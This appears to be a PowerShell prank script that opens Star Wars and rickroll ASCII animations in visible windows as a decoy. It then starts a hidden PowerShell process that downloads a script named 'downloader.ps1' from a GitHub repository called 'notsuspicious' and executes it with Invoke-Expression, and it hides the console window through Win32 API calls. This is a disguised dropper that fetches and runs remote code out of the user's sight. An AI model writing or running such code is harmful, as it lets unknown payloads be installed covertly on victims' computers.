
# Start Star Wars in a new Command Prompt window to the left
Start-Process cmd -ArgumentList "/c start telnet towel.blinkenlights.nl" -WindowStyle Normal
# Start rickroll in ASCII in a new Command Prompt window to the right
Start-Process cmd -ArgumentList "/c start cmd /k curl ascii.live/rick" -WindowStyle Normal

# Wait for a moment to let the windows start
# Define the URL of the VBScript
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Win32 {
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    }
"@

# Define the command to execute the PowerShell script content from the web
$command = "(Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content)"

# Start a hidden PowerShell process
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-NoLogo -NoProfile -Command $command"
$psi.WindowStyle = "Hidden"

$proc = [System.Diagnostics.Process]::Start($psi)

# Find the window handle and hide it
$handle = [Win32]::FindWindow("ConsoleWindowClass", $null)
if ($handle -ne [System.IntPtr]::Zero) {
    [Win32]::ShowWindow($handle, 0)  # 0 is SW_HIDE
}


